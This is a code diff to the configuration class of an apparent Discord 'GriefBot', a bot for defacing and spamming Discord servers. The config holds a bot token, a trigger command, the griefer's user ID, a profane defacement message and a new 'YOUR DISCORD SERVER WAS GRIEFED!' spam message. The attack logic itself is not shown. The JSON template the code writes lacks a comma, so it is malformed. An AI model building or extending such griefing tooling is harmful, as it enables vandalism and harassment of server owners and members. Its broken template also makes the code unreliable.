@@ -8,7 +8,6 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.net.URISyntaxException;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -16,49 +15,44 @@ import de.corruptedbytes.GriefBot;
 
 public class Config {
 
-	public static File griefPicture = new File("griefed.png");
-	private static File configFile = new File("config.json");
+	public final static File GRIEF_PICTURE = new File("griefed.png");
+	private final static File CONFIG_FILE = new File("config.json");
 
 	public static void initConfig() throws IOException {
-		if (!configFile.exists()) {
+		if (!CONFIG_FILE.exists()) {
 			createTemplateConfig();
-			System.out.println("Please edit " + configFile);
+			System.out.println("Please edit the File: " + CONFIG_FILE);
 			System.exit(-1);
 		}
 
 		String s = null;
 		StringBuilder configFileString = new StringBuilder();
-		InputStream in = new FileInputStream(configFile);
+		InputStream in = new FileInputStream(CONFIG_FILE);
 		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
 
-		try {
-			while ((s = reader.readLine()) != null) {
-				configFileString.append(s).append("\n");
-			}
-		} catch (IOException e) {
-			createTemplateConfig();
-			System.out.println("Please edit " + configFile);
+		while ((s = reader.readLine()) != null) {
+			configFileString.append(s).append("\n");
+		}
+		
+		reader.close();
+
+		if (!GRIEF_PICTURE.exists()) {
+			System.out.println("Please add an Image with File Name: " + GRIEF_PICTURE);
 			System.exit(-1);
 		}
-
-		if (!griefPicture.exists())
-			try {
-				Utils.extractResource(griefPicture.getName(), griefPicture.getName());
-			} catch (IOException | URISyntaxException e) {
-				e.printStackTrace();
-			}
 
 		GriefBot.getInstance().setDiscordBotToken(getJsonKey(configFileString.toString(), "botToken"));
 		GriefBot.getInstance().setGriefCommand(getJsonKey(configFileString.toString(), "griefCommand"));
 		GriefBot.getInstance().setGrieferUserID(getJsonKey(configFileString.toString(), "grieferUserID"));
 		GriefBot.getInstance().setActivityDescription(getJsonKey(configFileString.toString(), "activityDescription"));
 		GriefBot.getInstance().setGriefMessage(getJsonKey(configFileString.toString(), "griefMessage"));
+		GriefBot.getInstance().setSpamMessage(getJsonKey(configFileString.toString(), "spamMessage"));
 	}
 
 	private static void createTemplateConfig() throws IOException {
-		BufferedWriter writer = new BufferedWriter(new FileWriter(configFile));
+		BufferedWriter writer = new BufferedWriter(new FileWriter(CONFIG_FILE));
 		writer.write(
-				"{\n \"botToken\": \"YOUR-DISCORD-BOT-TOKEN-HERE\",\n \"griefCommand\": \"%start\",\n \"grieferUserID\": \"YOUR-USERID-HERE\",\n \"activityDescription\": \"Music\",\n \"griefMessage\": \"FUCKED-BY-%NAME%\"\n}");
+				"{\n \"botToken\": \"YOUR-DISCORD-BOT-TOKEN-HERE\",\n \"griefCommand\": \"%start\",\n \"grieferUserID\": \"YOUR-USERID-HERE\",\n \"activityDescription\": \"Music\",\n \"griefMessage\": \"FUCKED-BY-%s\"\n \"spamMessage\": \"YOUR DISCORD SERVER WAS GRIEFED!\"\n}");
 		writer.close();
 	}
 
